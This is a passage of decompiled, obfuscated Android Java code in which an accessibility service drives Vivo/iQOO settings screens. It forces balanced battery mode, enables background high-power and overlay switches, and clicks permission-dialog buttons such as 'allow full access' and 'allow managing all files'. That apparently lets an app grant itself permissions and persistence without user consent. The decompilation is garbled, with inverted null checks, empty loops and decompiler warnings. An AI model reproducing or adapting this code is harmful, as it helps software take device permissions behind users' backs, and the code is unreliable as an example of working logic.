                            if (accessibilityNodeInfoM212377d2 == null) {
                            }
                        } else {
                            t60.m214704c5(c0371a82.f55141a2, "[电池] ✅✅✅ 成功通过 battery_mode_view 点击'均衡'模式");
                            vivoSteps$clickBalancedMode$1.f54752a0 = accessibilityNodeInfo;
                            vivoSteps$clickBalancedMode$1.f54753a1 = null;
                            vivoSteps$clickBalancedMode$1.f54754a2 = null;
                            vivoSteps$clickBalancedMode$1.f54760a8 = 2;
                            if (b81.m210571b1(500L, vivoSteps$clickBalancedMode$1) != coroutineSingletons) {
                                accessibilityNodeInfo3 = accessibilityNodeInfo;
                                try {
                                    accessibilityNodeInfo3.recycle();
                                } catch (Exception unused2) {
                                }
                                return Boolean.TRUE;
                            }
                        }
                    }
                    return coroutineSingletons;
                }
                t60.m214704c5(str2, "[电池] ⚠️ 方式1: 未找到 battery_mode_view");
                c0371a8 = this;
                String str32 = c0371a8.f55141a2;
                t60.m214704c5(str32, "[电池] 🔍 方式2: 通过 contentDescription 查找'均衡模式'...");
                accessibilityNodeInfoM212377d2 = m212377d2(rootInActiveWindow, 0);
                if (accessibilityNodeInfoM212377d2 == null) {
                    Rect rectM24a52 = AbstractC0003a2.m24a5(accessibilityNodeInfoM212377d2);
                    t60.m214704c5(str32, "[电池] ✅ 找到均衡模式节点: bounds=" + rectM24a52);
                    float fCenterX2 = (float) rectM24a52.centerX();
                    float fCenterY2 = (float) rectM24a52.centerY();
                    vivoSteps$clickBalancedMode$1.f54752a0 = c0371a8;
                    vivoSteps$clickBalancedMode$1.f54753a1 = rootInActiveWindow;
                    vivoSteps$clickBalancedMode$1.f54754a2 = null;
                    vivoSteps$clickBalancedMode$1.f54760a8 = 3;
                    Boolean boolM212423f12 = c0371a8.m212423f1(fCenterX2, fCenterY2);
                    if (boolM212423f12 != coroutineSingletons) {
                        accessibilityNodeInfo2 = rootInActiveWindow;
                        obj2 = boolM212423f12;
                        zBooleanValue2 = ((Boolean) obj2).booleanValue();
                        t60.m214704c5(c0371a8.f55141a2, "[电池] 🖱️ 方式2 点击结果: " + zBooleanValue2);
                        if (zBooleanValue2) {
                            rootInActiveWindow = accessibilityNodeInfo2;
                            it2 = AbstractC0716jf.m213306g5("均衡", "Balance", "Balanced", "均衡模式", "正常", "Normal", "标准", "Standard").iterator();
                            if (!it2.hasNext()) {
                                str = (String) it2.next();
                                tz0.m214809a9("[电池] 🔍 方式3: 搜索文本'", str, "'...", c0371a8.f55141a2);
                                listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                                if (listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
                                    j = j2;
                                    obj = obj3;
                                    obj3 = obj;
                                    j2 = j;
                                    if (!it2.hasNext()) {
                                        t60.m214704c5(c0371a8.f55141a2, "[电池] ⚠️ 所有方式都未能点击'均衡'模式");
                                        try {
                                            rootInActiveWindow.recycle();
                                        } catch (Exception unused3) {
                                        }
                                        return Boolean.FALSE;
                                    }
                                } else {
                                    t60.m214704c5(c0371a8.f55141a2, "[电池] ✅ 找到 " + listFindAccessibilityNodeInfosByText.size() + " 个包含'" + str + "'的节点");
                                    C0371a8 c0371a84 = c0371a8;
                                    it3 = it2;
                                    it4 = listFindAccessibilityNodeInfosByText.iterator();
                                    c0371a83 = c0371a84;
                                    while (it4.hasNext()) {
                                        AccessibilityNodeInfo next = it4.next();
                                        if (next.isVisibleToUser()) {
                                            Rect rectM24a53 = AbstractC0003a2.m24a5(next);
                                            float fCenterX3 = rectM24a53.centerX();
                                            float fCenterY3 = rectM24a53.centerY();
                                            t60.m214704c5(c0371a83.f55141a2, AbstractC0003a2.m29b0("[电池] 📍 点击文本节点: (", fCenterX3, ", ", fCenterY3, ")"));
                                            vivoSteps$clickBalancedMode$1.f54752a0 = c0371a83;
                                            vivoSteps$clickBalancedMode$1.f54753a1 = rootInActiveWindow;
                                            vivoSteps$clickBalancedMode$1.f54754a2 = it3;
                                            vivoSteps$clickBalancedMode$1.f54755a3 = str;
                                            vivoSteps$clickBalancedMode$1.f54756a4 = listFindAccessibilityNodeInfosByText;
                                            vivoSteps$clickBalancedMode$1.f54757a5 = it4;
                                            vivoSteps$clickBalancedMode$1.f54760a8 = 5;
                                            Boolean boolM212423f13 = c0371a83.m212423f1(fCenterX3, fCenterY3);
                                            if (boolM212423f13 != coroutineSingletons) {
                                                accessibilityNodeInfo5 = rootInActiveWindow;
                                                obj2 = boolM212423f13;
                                                if (((Boolean) obj2).booleanValue()) {
                                                    rootInActiveWindow = accessibilityNodeInfo5;
                                                    obj3 = null;
                                                    while (it4.hasNext()) {
                                                    }
                                                } else {
                                                    tz0.m214809a9("[电池] ✅✅✅ 成功通过文本搜索点击'", str, "'", c0371a83.f55141a2);
                                                    t60.m214694b5(listFindAccessibilityNodeInfosByText, "nodes");
                                                    Iterator<T> it5 = listFindAccessibilityNodeInfosByText.iterator();
                                                    while (it5.hasNext()) {
                                                        try {
                                                            ((AccessibilityNodeInfo) it5.next()).recycle();
                                                        } catch (Exception unused4) {
                                                        }
                                                    }
                                                    vivoSteps$clickBalancedMode$1.f54752a0 = accessibilityNodeInfo5;
                                                    vivoSteps$clickBalancedMode$1.f54753a1 = null;
                                                    vivoSteps$clickBalancedMode$1.f54754a2 = null;
                                                    vivoSteps$clickBalancedMode$1.f54755a3 = null;
                                                    vivoSteps$clickBalancedMode$1.f54756a4 = null;
                                                    vivoSteps$clickBalancedMode$1.f54757a5 = null;
                                                    vivoSteps$clickBalancedMode$1.f54760a8 = 6;
                                                    if (b81.m210571b1(500L, vivoSteps$clickBalancedMode$1) != coroutineSingletons) {
                                                        accessibilityNodeInfo6 = accessibilityNodeInfo5;
                                                        try {
                                                            accessibilityNodeInfo6.recycle();
                                                        } catch (Exception unused5) {
                                                        }
                                                        return Boolean.TRUE;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    obj = obj3;
                                    j = 500;
                                    t60.m214694b5(listFindAccessibilityNodeInfosByText, "nodes");
                                    Iterator<T> it6 = listFindAccessibilityNodeInfosByText.iterator();
                                    while (it6.hasNext()) {
                                        try {
                                            ((AccessibilityNodeInfo) it6.next()).recycle();
                                        } catch (Exception unused6) {
                                        }
                                    }
                                    it2 = it3;
                                    c0371a8 = c0371a83;
                                    obj3 = obj;
                                    j2 = j;
                                    if (!it2.hasNext()) {
                                    }
                                }
                            }
                        } else {
                            t60.m214704c5(c0371a8.f55141a2, "[电池] ✅✅✅ 成功通过 contentDescription 点击'均衡模式'");
                            vivoSteps$clickBalancedMode$1.f54752a0 = accessibilityNodeInfo2;
                            vivoSteps$clickBalancedMode$1.f54753a1 = null;
                            vivoSteps$clickBalancedMode$1.f54760a8 = 4;
                            if (b81.m210571b1(500L, vivoSteps$clickBalancedMode$1) != coroutineSingletons) {
                                accessibilityNodeInfo4 = accessibilityNodeInfo2;
                                try {
                                    accessibilityNodeInfo4.recycle();
                                } catch (Exception unused7) {
                                }
                                return Boolean.TRUE;
                            }
                        }
                    }
                    return coroutineSingletons;
                }
                t60.m214704c5(str32, "[电池] ⚠️ 方式2: 未找到 contentDescription 包含'均衡模式'的节点");
                it2 = AbstractC0716jf.m213306g5("均衡", "Balance", "Balanced", "均衡模式", "正常", "Normal", "标准", "Standard").iterator();
                if (!it2.hasNext()) {
                }
                break;
            case 1:
                list = (List) vivoSteps$clickBalancedMode$1.f54754a2;
                accessibilityNodeInfo = vivoSteps$clickBalancedMode$1.f54753a1;
                c0371a82 = (C0371a8) vivoSteps$clickBalancedMode$1.f54752a0;
                kg1.m213544f4(obj2);
                zBooleanValue = ((Boolean) obj2).booleanValue();
                t60.m214704c5(c0371a82.f55141a2, "[电池] 🖱️ 方式1 点击结果: " + zBooleanValue);
                t60.m214694b5(list, "modeViewNodes");
                it = list.iterator();
                while (it.hasNext()) {
                }
                if (zBooleanValue) {
                }
                break;
            case 2:
                accessibilityNodeInfo3 = (AccessibilityNodeInfo) vivoSteps$clickBalancedMode$1.f54752a0;
                kg1.m213544f4(obj2);
                accessibilityNodeInfo3.recycle();
                return Boolean.TRUE;
            case 3:
                accessibilityNodeInfo2 = vivoSteps$clickBalancedMode$1.f54753a1;
                c0371a8 = (C0371a8) vivoSteps$clickBalancedMode$1.f54752a0;
                kg1.m213544f4(obj2);
                zBooleanValue2 = ((Boolean) obj2).booleanValue();
                t60.m214704c5(c0371a8.f55141a2, "[电池] 🖱️ 方式2 点击结果: " + zBooleanValue2);
                if (zBooleanValue2) {
                }
                break;
            case 4:
                accessibilityNodeInfo4 = (AccessibilityNodeInfo) vivoSteps$clickBalancedMode$1.f54752a0;
                kg1.m213544f4(obj2);
                accessibilityNodeInfo4.recycle();
                return Boolean.TRUE;
            case 5:
                it4 = vivoSteps$clickBalancedMode$1.f54757a5;
                List<AccessibilityNodeInfo> list2 = vivoSteps$clickBalancedMode$1.f54756a4;
                str = vivoSteps$clickBalancedMode$1.f54755a3;
                Iterator it7 = (Iterator) vivoSteps$clickBalancedMode$1.f54754a2;
                accessibilityNodeInfo5 = vivoSteps$clickBalancedMode$1.f54753a1;
                C0371a8 c0371a85 = (C0371a8) vivoSteps$clickBalancedMode$1.f54752a0;
                kg1.m213544f4(obj2);
                listFindAccessibilityNodeInfosByText = list2;
                it3 = it7;
                c0371a83 = c0371a85;
                if (((Boolean) obj2).booleanValue()) {
                }
                break;
            case 6:
                accessibilityNodeInfo6 = (AccessibilityNodeInfo) vivoSteps$clickBalancedMode$1.f54752a0;
                kg1.m213544f4(obj2);
                accessibilityNodeInfo6.recycle();
                return Boolean.TRUE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:31:0x00ac, code lost:
    
        r6 = p000.AbstractC0716jf.m213306g5("允许", "允许后台高耗电", "不限制").iterator();
     */
    /* JADX WARN: Code restructure failed: missing block: B:33:0x00c2, code lost:
    
        if (r6.hasNext() == false) goto L87;
     */
    /* JADX WARN: Code restructure failed: missing block: B:34:0x00c4, code lost:
    
        r8 = (java.lang.String) r6.next();
        r9 = r7.findAccessibilityNodeInfosByText(r8).iterator();
     */
    /* JADX WARN: Code restructure failed: missing block: B:36:0x00d6, code lost:
    
        if (r9.hasNext() == false) goto L89;
     */
    /* JADX WARN: Code restructure failed: missing block: B:37:0x00d8, code lost:
    
        r10 = r9.next();
     */
    /* JADX WARN: Code restructure failed: missing block: B:38:0x00e2, code lost:
    
        if (r10.isVisibleToUser() == false) goto L92;
     */
    /* JADX WARN: Code restructure failed: missing block: B:39:0x00e4, code lost:
    
        r11 = r10.getText();
     */
    /* JADX WARN: Code restructure failed: missing block: B:40:0x00e8, code lost:
    
        if (r11 == null) goto L42;
     */
    /* JADX WARN: Code restructure failed: missing block: B:41:0x00ea, code lost:
    
        r11 = r11.toString();
     */
    /* JADX WARN: Code restructure failed: missing block: B:42:0x00ef, code lost:
    
        r11 = null;
     */
    /* JADX WARN: Code restructure failed: missing block: B:44:0x00f4, code lost:
    
        if (p000.t60.m214686a2(r11, r8) == false) goto L93;
     */
    /* JADX WARN: Code restructure failed: missing block: B:45:0x00f6, code lost:
    
        r13 = p000.AbstractC0003a2.m24a5(r10);
        r0.m212424f2(r13.centerX(), r13.centerY());
     */
    /* JADX WARN: Code restructure failed: missing block: B:48:0x010f, code lost:
    
        p000.t60.m214726f4(r5, "[Android10+] ❌ 未找到任何vos_button按钮或允许文本");
     */
    /* JADX WARN: Code restructure failed: missing block: B:50:0x0120, code lost:
    
        if (p000.b81.m210571b1(300, r13) == r1) goto L55;
     */
    /* JADX WARN: Code restructure failed: missing block: B:54:0x0138, code lost:
    
        if (r13 == r1) goto L55;
     */
    /* JADX WARN: Removed duplicated region for block: B:19:0x0051  */
    /* JADX WARN: Removed duplicated region for block: B:53:0x0126  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:50:0x0120 -> B:52:0x0123). Please report as a decompilation issue!!! */
    /* renamed from: a6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212389a6(ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$clickInDetailPage$1 vivoSteps$clickInDetailPage$1;
        VivoSteps$clickInDetailPage$1 vivoSteps$clickInDetailPage$12;
        int i;
        C0371a8 c0371a8;
        if (continuationImpl instanceof VivoSteps$clickInDetailPage$1) {
            vivoSteps$clickInDetailPage$1 = (VivoSteps$clickInDetailPage$1) continuationImpl;
            int i2 = vivoSteps$clickInDetailPage$1.f54765a4;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                vivoSteps$clickInDetailPage$1.f54765a4 = i2 - Integer.MIN_VALUE;
            } else {
                vivoSteps$clickInDetailPage$1 = new VivoSteps$clickInDetailPage$1(this, continuationImpl);
            }
        }
        Object objM212393b0 = vivoSteps$clickInDetailPage$1.f54763a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = vivoSteps$clickInDetailPage$1.f54765a4;
        if (i3 == 0) {
            kg1.m213544f4(objM212393b0);
            t60.m214704c5(this.f55141a2, "[详情页] 🔍 尝试点击 vos_button_opt 按钮...");
            vivoSteps$clickInDetailPage$12 = vivoSteps$clickInDetailPage$1;
            i = 1;
            c0371a8 = this;
            if (i >= 4) {
            }
            return coroutineSingletons;
        }
        if (i3 != 1) {
            if (i3 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            c0371a8 = vivoSteps$clickInDetailPage$1.f54761a0;
            kg1.m213544f4(objM212393b0);
            if (((Boolean) objM212393b0).booleanValue()) {
                t60.m214704c5(c0371a8.f55141a2, "[详情页] ✅ 允许后台高耗电 点击成功");
                return Boolean.TRUE;
            }
            String str = c0371a8.f55141a2;
            t60.m214704c5(str, "[详情页] 🔍 尝试在详情页找开关...");
            AccessibilityNodeInfo rootInActiveWindow = c0371a8.f55139a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                for (AccessibilityNodeInfo accessibilityNodeInfo : rootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/switch_widget")) {
                    if (accessibilityNodeInfo.isVisibleToUser() && accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
                        t60.m214704c5(str, "[详情页] ✅ 开关点击成功");
                        rootInActiveWindow.recycle();
                        return Boolean.TRUE;
                    }
                }
                rootInActiveWindow.recycle();
            }
            t60.m214704c5(str, "[详情页] ❌ 所有尝试都失败");
            return Boolean.FALSE;
        }
        i = vivoSteps$clickInDetailPage$1.f54762a1;
        C0371a8 c0371a82 = vivoSteps$clickInDetailPage$1.f54761a0;
        kg1.m213544f4(objM212393b0);
        vivoSteps$clickInDetailPage$12 = vivoSteps$clickInDetailPage$1;
        c0371a8 = c0371a82;
        i++;
        if (i >= 4) {
            String str2 = c0371a8.f55141a2;
            AccessibilityNodeInfo rootInActiveWindow2 = c0371a8.f55139a0.getRootInActiveWindow();
            if (rootInActiveWindow2 != null) {
                Iterator it = AbstractC0716jf.m213306g5("com.vivo.abe:id/vos_button_no_opt", "com.vivo.abe:id/vos_button_opt", "com.iqoo.powersaving:id/vos_button_opt").iterator();
                while (true) {
                    if (!it.hasNext()) {
                        break;
                    }
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow2.findAccessibilityNodeInfosByViewId((String) it.next());
                    t60.m214694b5(listFindAccessibilityNodeInfosByViewId, "nodes");
                    if (!listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                        AccessibilityNodeInfo accessibilityNodeInfo2 = listFindAccessibilityNodeInfosByViewId.get(0);
                        if (!accessibilityNodeInfo2.isChecked()) {
                            Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo2);
                            c0371a8.m212424f2(rectM24a5.centerX(), rectM24a5.centerY());
                        }
                    }
                }
                t60.m214704c5(c0371a8.f55141a2, "[详情页] ✅ vos_button_opt 点击成功");
                return Boolean.TRUE;
            }
            t60.m214704c5(str2, "[Android10+] rootInActiveWindow == null");
            vivoSteps$clickInDetailPage$12.f54761a0 = c0371a8;
            vivoSteps$clickInDetailPage$12.f54762a1 = i;
            vivoSteps$clickInDetailPage$12.f54765a4 = 1;
        } else {
            t60.m214704c5(c0371a8.f55141a2, "[详情页] 🔍 尝试点击「允许后台高耗电」文本...");
            vivoSteps$clickInDetailPage$12.f54761a0 = c0371a8;
            vivoSteps$clickInDetailPage$12.f54765a4 = 2;
            objM212393b0 = c0371a8.m212393b0("允许后台高耗电#后台高耗电", 0, 5, vivoSteps$clickInDetailPage$12);
        }
        return coroutineSingletons;
    }

    /* renamed from: a7 */
    public final boolean m212390a7() {
        String string;
        String string2;
        AccessibilityNodeInfo rootInActiveWindow = this.f55139a0.getRootInActiveWindow();
        if (rootInActiveWindow != null) {
            String[] strArr = {"允许完全访问", "始终允许", "允许", "确定", "同意", "好的", "仅使用时允许", "仅使用期间允许", "仅在使用中允许", "使用期间允许", "使用应用时允许", "使用时允许", "仅在使用该应用时允许", "允许使用照片和视频", "所有文件", "允许管理所有文件", "允许访问全部", "仅媒体", "开启", "打开", "去开启"};
            for (int i = 0; i < 21; i++) {
                String str = strArr[i];
                try {
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                    if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                        for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                            CharSequence text = accessibilityNodeInfo.getText();
                            if (text == null || (string2 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string2).toString()) == null) {
                                string = "";
                            }
                            if (string.equals(str)) {
                                String str2 = this.f55141a2;
                                t60.m214704c5(str2, "[基础权限] 找到按钮: '" + string + "'");
                                if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
                                    tz0.m214809a9("[基础权限] ✅ 点击成功: '", string, "'", str2);
                                    return true;
                                }
                                AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                                for (int i2 = 0; parent != null && i2 < 5; i2++) {
                                    if (parent.isClickable() && parent.performAction(16)) {
                                        tz0.m214809a9("[基础权限] ✅ 父节点点击成功: '", string, "'", str2);
                                        return true;
                                    }
                                    parent = parent.getParent();
                                }
                            }
                        }
                    }
                } catch (Exception unused) {
                }
            }
        }
        return false;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212391a8(ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$clickSwitchInDetailPage$1 vivoSteps$clickSwitchInDetailPage$1;
        AccessibilityNodeInfo accessibilityNodeInfo;
        if (continuationImpl instanceof VivoSteps$clickSwitchInDetailPage$1) {
            vivoSteps$clickSwitchInDetailPage$1 = (VivoSteps$clickSwitchInDetailPage$1) continuationImpl;
            int i = vivoSteps$clickSwitchInDetailPage$1.f54769a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                vivoSteps$clickSwitchInDetailPage$1.f54769a3 = i - Integer.MIN_VALUE;
            } else {
                vivoSteps$clickSwitchInDetailPage$1 = new VivoSteps$clickSwitchInDetailPage$1(this, continuationImpl);
            }
        }
        Object obj = vivoSteps$clickSwitchInDetailPage$1.f54767a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = vivoSteps$clickSwitchInDetailPage$1.f54769a3;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            AccessibilityNodeInfo rootInActiveWindow = this.f55139a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return Boolean.FALSE;
            }
            C0127ba c0127ba = new C0127ba();
            c0127ba.addLast(rootInActiveWindow);
            while (!c0127ba.isEmpty()) {
                AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) c0127ba.removeFirst();
                CharSequence className = accessibilityNodeInfo2.getClassName();
                if (!t60.m214686a2(className != null ? className.toString() : null, "android.widget.Switch")) {
                    int childCount = accessibilityNodeInfo2.getChildCount();
                    for (int i3 = 0; i3 < childCount; i3++) {
                        AccessibilityNodeInfo child = accessibilityNodeInfo2.getChild(i3);
                        if (child != null) {
                            c0127ba.addLast(child);
                        }
                    }
                } else {
                    if (accessibilityNodeInfo2.isChecked()) {
                        rootInActiveWindow.recycle();
                        return Boolean.TRUE;
                    }
                    m212422f0(accessibilityNodeInfo2);
                    vivoSteps$clickSwitchInDetailPage$1.f54766a0 = rootInActiveWindow;
                    vivoSteps$clickSwitchInDetailPage$1.f54769a3 = 1;
                    if (b81.m210571b1(100L, vivoSteps$clickSwitchInDetailPage$1) == coroutineSingletons) {
                        return coroutineSingletons;
                    }
                    accessibilityNodeInfo = rootInActiveWindow;
                }
            }
            t60.m214704c5(this.f55141a2, "[悬浮窗权限] ❌ 详情页未找到开关");
            rootInActiveWindow.recycle();
            return Boolean.FALSE;
        }
        if (i2 != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        accessibilityNodeInfo = vivoSteps$clickSwitchInDetailPage$1.f54766a0;
        kg1.m213544f4(obj);
        accessibilityNodeInfo.recycle();
        return Boolean.TRUE;
    }

    /* renamed from: a9 */
    public final boolean m212392a9(String str) {
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        String string;
        String string2;
        AccessibilityNodeInfo rootInActiveWindow = this.f55139a0.getRootInActiveWindow();
        if (rootInActiveWindow != null && (listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str)) != null) {
            for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                CharSequence text = accessibilityNodeInfo.getText();
                if (text == null || (string2 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string2).toString()) == null) {
                    string = "";
                }
                if (string.equals(str)) {
                    boolean zIsClickable = accessibilityNodeInfo.isClickable();
                    String str2 = this.f55141a2;
                    if (zIsClickable && accessibilityNodeInfo.performAction(16)) {
                        t60.m214704c5(str2, "[基础权限] ✅ 点击成功: ".concat(string));
                        return true;
                    }
                    AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                    for (int i = 0; parent != null && i < 5; i++) {
                        if (parent.isClickable() && parent.performAction(16)) {
                            t60.m214704c5(str2, "[基础权限] ✅ 父节点点击成功: ".concat(string));
                            return true;
                        }
                        parent = parent.getParent();
                    }
                }
            }
        }
        return false;
    }

    /* JADX WARN: Removed duplicated region for block: B:47:0x0125  */
    /* JADX WARN: Removed duplicated region for block: B:50:0x0133  */
    /* JADX WARN: Removed duplicated region for block: B:52:0x0136  */
    /* JADX WARN: Removed duplicated region for block: B:76:0x021d  */
    /* JADX WARN: Removed duplicated region for block: B:77:0x0228  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:74:0x0217 -> B:75:0x021b). Please report as a decompilation issue!!! */
    /* renamed from: b0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212393b0(String str, int i, int i2, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$clickTextWithScroll$1 vivoSteps$clickTextWithScroll$1;
        C0371a8 c0371a8;
        String str2;
        int i3;
        List list;
        String str3;
        C0371a8 c0371a82;
        String str4;
        String str5;
        List list2;
        int i4;
        int i5;
        AccessibilityNodeInfo rootInActiveWindow;
        if (continuationImpl instanceof VivoSteps$clickTextWithScroll$1) {
            vivoSteps$clickTextWithScroll$1 = (VivoSteps$clickTextWithScroll$1) continuationImpl;
            int i6 = vivoSteps$clickTextWithScroll$1.f54777a7;
            if ((i6 & Integer.MIN_VALUE) != 0) {
                vivoSteps$clickTextWithScroll$1.f54777a7 = i6 - Integer.MIN_VALUE;
            } else {
                vivoSteps$clickTextWithScroll$1 = new VivoSteps$clickTextWithScroll$1(this, continuationImpl);
            }
        }
        Object obj = vivoSteps$clickTextWithScroll$1.f54775a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i7 = vivoSteps$clickTextWithScroll$1.f54777a7;
        String str6 = "[滚动点击] ❌ 未找到: ";
        String str7 = "」找到 ";
        if (i7 == 0) {
            kg1.m213544f4(obj);
            List<String> listM213677d0 = AbstractC0779a1.m213677d0(str, new String[]{"#"}, 6);
            AccessibilityNodeInfo rootInActiveWindow2 = this.f55139a0.getRootInActiveWindow();
            String str8 = this.f55141a2;
            if (rootInActiveWindow2 != null) {
                for (String str9 : listM213677d0) {
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow2.findAccessibilityNodeInfosByText(str9);
                    t60.m214704c5(str8, "[滚动点击] 先查找「" + str9 + "」找到 " + (listFindAccessibilityNodeInfosByText != null ? listFindAccessibilityNodeInfosByText.size() : 0) + " 个节点");
                    for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                        t60.m214694b5(accessibilityNodeInfo, "node");
                        if (m212421e9(accessibilityNodeInfo)) {
                            tz0.m214807a7("[滚动点击] ✅ 直接找到并点击: ", str9, str8);
                            return Boolean.TRUE;
                        }
                    }
                }
            }
            if (i == 0) {
                tz0.m214809a9("[滚动点击] ❌ 未找到: ", str, " (不滚动)", str8);
                return Boolean.FALSE;
            }
            t60.m214704c5(str8, "[滚动点击] 未直接找到，先滚到顶部");
            vivoSteps$clickTextWithScroll$1.f54770a0 = this;
            vivoSteps$clickTextWithScroll$1.f54771a1 = str;
            vivoSteps$clickTextWithScroll$1.f54772a2 = listM213677d0;
            vivoSteps$clickTextWithScroll$1.f54773a3 = i2;
            vivoSteps$clickTextWithScroll$1.f54777a7 = 1;
            m212429f7();
            if (C1351vv.f60710b1 != coroutineSingletons) {
                c0371a8 = this;
                str2 = str;
                i3 = i2;
                list = listM213677d0;
            }
            return coroutineSingletons;
        }
        if (i7 == 1) {
            i3 = vivoSteps$clickTextWithScroll$1.f54773a3;
            list = vivoSteps$clickTextWithScroll$1.f54772a2;
            str2 = vivoSteps$clickTextWithScroll$1.f54771a1;
            c0371a8 = vivoSteps$clickTextWithScroll$1.f54770a0;
            kg1.m213544f4(obj);
        } else {
            if (i7 != 2) {
                if (i7 != 3) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                i5 = vivoSteps$clickTextWithScroll$1.f54774a4;
                i4 = vivoSteps$clickTextWithScroll$1.f54773a3;
                list2 = vivoSteps$clickTextWithScroll$1.f54772a2;
                String str10 = vivoSteps$clickTextWithScroll$1.f54771a1;
                C0371a8 c0371a83 = vivoSteps$clickTextWithScroll$1.f54770a0;
                kg1.m213544f4(obj);
                str4 = "[滚动点击] ❌ 未找到: ";
                String str11 = "」找到 ";
                boolean z = true;
                str5 = str10;
                c0371a82 = c0371a83;
                if (i5 != i4) {
                    i5++;
                    str7 = str11;
                    str6 = str4;
                    dqtvuisjd dqtvuisjdVar = c0371a82.f55139a0;
                    String str12 = c0371a82.f55141a2;
                    rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow();
                    if (rootInActiveWindow != null) {
                        return Boolean.FALSE;
                    }
                    Iterator it = list2.iterator();
                    while (it.hasNext()) {
                        String str13 = (String) it.next();
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = rootInActiveWindow.findAccessibilityNodeInfosByText(str13);
                        AccessibilityNodeInfo accessibilityNodeInfo2 = rootInActiveWindow;
                        StringBuilder sbM40c1 = AbstractC0003a2.m40c1("[滚动点击] 查找「", str13, str7, listFindAccessibilityNodeInfosByText2 != null ? listFindAccessibilityNodeInfosByText2.size() : 0, " 个节点 (第");
                        sbM40c1.append(i5);
                        sbM40c1.append("次)");
                        t60.m214704c5(str12, sbM40c1.toString());
                        Iterator<AccessibilityNodeInfo> it2 = listFindAccessibilityNodeInfosByText2.iterator();
                        while (it2.hasNext()) {
                            AccessibilityNodeInfo next = it2.next();
                            Iterator<AccessibilityNodeInfo> it3 = it2;
                            String str14 = str7;
                            Iterator it4 = it;
                            String str15 = str6;
                            t60.m214704c5(str12, "[滚动点击] 节点: text=" + ((Object) next.getText()) + ", visible=" + next.isVisibleToUser() + ", clickable=" + next.isClickable());
                            if (c0371a82.m212421e9(next)) {
                                t60.m214704c5(str12, "[滚动点击] ✅ " + str13 + " (第" + i5 + "次)");
                                return Boolean.TRUE;
                            }
                            tz0.m214807a7("[滚动点击] ❌ performClick 失败: ", str13, str12);
                            it2 = it3;
                            it = it4;
                            str7 = str14;
                            str6 = str15;
                        }
                        rootInActiveWindow = accessibilityNodeInfo2;
                    }
                    str4 = str6;
                    str11 = str7;
                    if (i5 < i4) {
                        z = true;
                        c0371a82.m212425f3(true);
                        vivoSteps$clickTextWithScroll$1.f54770a0 = c0371a82;
                        vivoSteps$clickTextWithScroll$1.f54771a1 = str5;
                        vivoSteps$clickTextWithScroll$1.f54772a2 = list2;
                        vivoSteps$clickTextWithScroll$1.f54773a3 = i4;
                        vivoSteps$clickTextWithScroll$1.f54774a4 = i5;
                        vivoSteps$clickTextWithScroll$1.f54777a7 = 3;
                        VivoSteps$clickTextWithScroll$1 vivoSteps$clickTextWithScroll$12 = vivoSteps$clickTextWithScroll$1;
                        C0371a8 c0371a84 = c0371a82;
                        if (c0371a84.m212437g5(3, 50L, 1500L, vivoSteps$clickTextWithScroll$12) != coroutineSingletons) {
                            c0371a82 = c0371a84;
                            vivoSteps$clickTextWithScroll$1 = vivoSteps$clickTextWithScroll$12;
                            if (i5 != i4) {
                            }
                        }
                        return coroutineSingletons;
                    }
                }
                str3 = str5;
